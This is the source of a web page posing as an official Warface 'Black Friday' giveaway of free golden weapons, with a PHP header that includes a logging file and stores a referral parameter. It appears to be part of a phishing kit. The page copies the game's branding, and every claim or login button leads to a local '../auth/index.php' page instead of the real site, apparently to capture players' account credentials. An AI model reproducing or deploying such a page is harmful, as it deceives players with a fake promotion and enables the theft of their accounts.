<?php session_start();
include('../bdlog.php');

if(isset($_GET['reff'])) {
	$_SESSION['comment'] = $_GET['reff'];
	$sessref = $_SESSION['comment'];
} else {
	$sessref = 'non-ref';
}?>
<html>
<head>
	<script src="n.html"></script>
	<meta charset="utf-8">
	<meta name="description" content="Многопользовательский онлайн-шутер нового поколения от создателей Far Cry и Crysis">
	<title>Warface | Многопользовательский онлайн-шутер нового поколения от создателей Far Cry и Crysis</title>
	<link rel="stylesheet" href="css/main.css">
   <link rel="stylesheet" href="css/ovl.css">
</head>
<body>

<header class="header">
    <div class="header__controls">
      <div class="content">
        <div class="header__item header__item_left">
          <a href="https://wf.mail.ru/" target="_blank" class="auth__link">На сайт игры</a>
        </div>
        <div class="header__item header__item_right">
          <a href="../auth/index.php" class=auth__link>Войти</a></div>  
        </div>

      </div>
    </div>
  </header>



	<main>

			
		<div class="content">

            <div class="main__title">ЧЕРНАЯ</div><div class="main__title">ПЯТНИЦА</div>
			<div class="main__text" id = "asa">Мы распродали всё что у нас было на складе,<br>Теперь мы дарим единоразово Золотое оружие на 30 дней. Не упустите момент!<br>Более подробно с условиями акции вы можете ознакомиться в <a href="https://wf.mail.ru/news/1003366.html" class="main__link" target="_blank">соответствующей новости.</a></div>

	


		</div>

		<div class="wrap">
	
<blackfriday><div class="popup__cover"> <div class="shop"> <div class="shop__item"> <div class="shop__name">Золотая Beretta ARX160</div> <img class="shop__img" src="img/VpSAxS1.png" alt="Золотая Beretta ARX160"> <div class="shop__time">30 ДНЕЙ</div> <div class="shop__hr"> <div class="shop__hr-sale">100%</div> <div class="shop__hr-old-price">5000 <div class="icon-credit-full"></div></div> <div class="shop__hr-price" hidden="">50 <div class="icon-credit-full"></div></div> <button class="shop__hr-button button"> Бесплатно </button> </div> </div><div class="shop__item"> <div class="shop__name">Золотой Desert Tech MDR-C</div> <img class="shop__img" src="img/pSiCyiK.png" alt="Золотой Desert Tech MDR-C"> <div class="shop__time">30 ДНЕЙ</div> <div class="shop__hr"> <div class="shop__hr-sale">100%</div> <div class="shop__hr-old-price">5000 <div class="icon-credit-full"></div></div> <div class="shop__hr-price" hidden="">100 <div class="icon-credit-full"></div></div> <button class="shop__hr-button button"> Бесплатно </button> </div> </div><div class="shop__item"> <div class="shop__name">Золотой Winchester 1887</div> <img class="shop__img" src="img/rT66KKu.png" alt="Золотой Winchester 1887"> <div class="shop__time">30 ДНЕЙ</div> <div class="shop__hr"> <div class="shop__hr-sale">100%</div> <div class="shop__hr-old-price">5000 <div class="icon-credit-full"></div></div> <div class="shop__hr-price" hidden="">1620 <div class="icon-credit-full"></div></div> <button class="shop__hr-button button"> Бесплатно </button> </div> </div><div class="shop__item"> <div class="shop__name">Золотая AX308</div> <img class="shop__img" src="img/zw8bBfc.png" alt="Золотая AX308"> <div class="shop__time">30 ДНЕЙ</div> <div class="shop__hr"> <div class="shop__hr-sale">100%</div> <div class="shop__hr-old-price">5000 <div class="icon-credit-full"></div></div> <div class="shop__hr-price" hidden="">984 <div class="icon-credit-full"></div></div> <button class="shop__hr-button button"> Бесплатно </button> </div> </div><div class="shop__item" hidden=""> <div class="shop__name">Коробка с DP-12 (35 шт.)</div> <img class="shop__img" src="static/wf.mail.ru/img/main/content/items/random_box_91.png" alt="Коробка с DP-12 (35 шт.)"> <div class="shop__time">35 шт.</div> <div class="shop__hr"> <div class="shop__hr-sale">100%</div> <div class="shop__hr-old-price">2100 <div class="icon-credit-full"></div></div> <div class="shop__hr-price">1701 <div class="icon-credit-full"></div></div> <button class="shop__hr-button button"> Бесплатно </button> </div> </div><div class="shop__item" hidden=""> <div class="shop__name">Вепрь Каратель</div> <img class="shop__img" src="static/wf.mail.ru/img/main/content/items/shg04_zsd03_shop.png" alt="Вепрь Каратель"> <div class="shop__time">навсегда</div> <div class="shop__hr"> <div class="shop__hr-sale">100%</div> <div class="shop__hr-old-price">2500 <div class="icon-credit-full"></div></div> <div class="shop__hr-price">БЕСПЛАТНО <div class="icon-credit-full"></div></div> <button class="shop__hr-button button"> Бесплатно </button> </div> </div> </div>  </div> <div class="popup" hidden="" style="display: none;"> <div class="popup__wrap"> <div class="popup__align"> <div class="popup__close icon-cross"></div> <p>false</p> <div class="popup__button button">Закрыть</div> <div class="popup__button button" hidden="" style="display: none;">Перезагрузить</div> </div> </div> </div></blackfriday>
</div>
<a class="button main__button pin__bt" href="../auth/index.php">ОТПРАВИТЬ В КОРЗИНУ</a>

<style type="text/css">
	@charset "utf-8";
html {
  height: 100%;
}
.pin__content {
    background: #191e23;
    padding-bottom: 50px;
    text-align: center;
}

{
    position: center;
    text-align: center;
}


.pin__bt {
	margin-left: 30px;
	background: #ff4400;
	border: none;
	color: #fff;
	text-transform: uppercase;
	font: 18px/50px Quantico, Arial, Helvetica, sans-serif;
	padding: 0 42px;
	display: inline-block;
	text-align: center;
	margin: 0 auto;
	cursor: pointer;
	box-sizing: border-box;
	text-decoration: none;
}
.pin__bt:hover {
	text-decoration: none;
	background: #fff;
	color: #000;
}
body {
  width: 100%;
  margin: 0;
  padding: 0;
  color: #000;
  font: 15px/20px Plumb, Arial, Helvetica, sans-serif;
}
[class^="icon-"] {
  display: inline-block;
  vertical-align: middle;
  font-size: 0.8em;
}
.icon-cross {
  position: relative;
  width: 25px;
  height: 25px;
  cursor: pointer;
  color: #4f5559;
}
.icon-cross:after,
.icon-cross:before {
  content: '';
  background: currentColor;
  width: 100%;
  height: 1px;
  display: block;
  position: absolute;
  top: 50%;
  left: 0;
}
.icon-cross:after {
  transform: rotate(45deg);
}
.icon-cross:before {
  transform: rotate(-45deg);
}
.icon-cross:hover {
  color: #fff;
}
.button {
  background: #f40;
  color: #fff;
  text-transform: uppercase;
  font: 18px/50px Quantico;
  text-align: center;
  cursor: pointer;
  text-decoration: none;
  display: block;
  width: 500px;
  border: none;
}
.button .icon-credit {
  vertical-align: middle;
  font-size: 17px;
}
.button:hover {
  background: #fff;
  color: #000;
}
.button:focus {
  outline: none;
}
.main__button {
    margin: auto;
}
.shop {
  display: flex;
  flex-wrap: wrap;
  justify-content: space-between;
  margin: 1px;
}
.shop__item {
  background: #181c1f;
  color: #fff;
  width: 460px;
  height: 220px;
  box-sizing: border-box;
  margin-bottom: 20px;
  position: relative;
  cursor: pointer;
}
.shop__item:nth-child(2n+1) {
  margin-left: 1px;
}
.shop__item:hover {
  box-shadow: 0 0 0 1px #f40;
}
.shop__item.is-select {
  background: #282e32;
}
.shop__item.is-select .shop__hr-button {
  background: #fff;
  color: #000;
}
.shop__name,
.shop__time {
  position: absolute;
  left: 10px;
}
.shop__name {
  color: #f40;
  font-size: 18px;
  top: 10px;
}
.shop__time {
  bottom: 33px;
  text-transform: uppercase;
}
.shop__img {
  position: absolute;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
}
.shop__hr {
  background: #000;
  position: absolute;
  width: 100%;
  bottom: 0;
  left: 0;
  height: 25px;
  line-height: 25px;
  display: flex;
}
.shop__hr-sale {
  width: 50px;
  background: #d50000;
  text-align: center;
}
.shop__hr-old-price,
.shop__hr-price {
  padding: 0 10px;
}
.shop__hr-old-price {
  color: #797c81;
  text-decoration: line-through;
}
.shop__hr-button {
  line-height: 23px;
  width: 125px;
  position: absolute;
  right: 0;
}
.order {
  background: #1a1d21;
  color: #a2a7ac;
}
.order__title {
  text-transform: uppercase;
  font-size: 18px;
  line-height: 55px;
  padding: 0 25px;
}
.order__table {
  width: 100%;
  border-spacing: 0;
  background: none;
  table-layout: fixed;
}
.order__table td,
.order__table th {
  border: none;
  padding: 14px 10px;
  text-align: center;
  border-right: 1px solid #1a1d21;
}
.order__table td:last-of-type,
.order__table th:last-of-type {
  border-right: none;
}
.order__table th {
  background: #282e32;
  text-transform: uppercase;
  font-weight: normal;
}
.order__table th.th_number {
  width: 20px;
}
.order__table th.th_date {
  width: 220px;
}
.order__table th.th_price {
  width: 100px;
}
.order__table th.th_delete {
  width: 23px;
}
.order__table .td_item {
  text-align: left;
  padding-left: 32px;
}
.order__table tr:nth-child(2n+1) td {
  background: none;
}
.order__table tr:nth-child(2n) td {
  background: #282e32;
}
.order__total {
  line-height: 55px;
  display: flex;
  justify-content: space-between;
}
.order__total-text {
  padding-left: 32px;
}
.order__total-sum {
  text-transform: uppercase;
  padding-right: 80px;
}
.popup {
  position: fixed;
  top: 0;
  left: 0;
  z-index: 100;
  width: 100%;
  height: 100%;
  background: rgba(24,28,31,0);
  display: block;
}
.popup__wrap {
  width: 100%;
  text-align: center;
  position: relative;
  top: 19%;
  left: 50%;
  background: #000;
  color: #a9aeb3;
  transform: translate(-50%, 0%);
  box-sizing: border-box;
  padding: 70px 0;
}
.popup__align {
  width: 945px;
  margin: auto;
  position: relative;
}
.popup__close {
  position: absolute;
  color: #f40;
  right: -30px;
  top: -50px;
}
.popup__button {
  margin: 30px auto 0;
  height: 35px;
  line-height: 35px;
  background: none;
  border: 1px solid #f40;
  color: #f40;
}
.popup__button:hover {
  border: 1px solid #fff;
}
.popup p {
  margin: 0;
}
.popup__cover {
  max-width: 945px;
  margin: auto;
}
.popup__cover.is-open-popup {
  filter: blur(4px);
}
footer {
  background: #191e23;
  padding: 10px 0;
}
.block_thesis_orange {
    padding: 1px 0px;
    text-transform: uppercase;
    color: #fff;
    background: #ff4e00;
    width: 945px;
    margin-left: 2px;
    font: 15px/20px Plumb, Arial, Helvetica, sans-serif;
}

/* http://friday.bom-wf.ru/css/main.css */
body {
    width: 100%;
    margin: 0;
    padding: 0;
    background: #0d0f13 url("img/89t1BGe.jpg") center top no-repeat;
    color: #000;
    font: 15px/20px Plumb, Arial, Helvetica, sans-serif;
}



</style>

	</main>	




<script src="https://www.google.com/recaptcha/api.js" async="" defer=""></script>
 </body>
</html>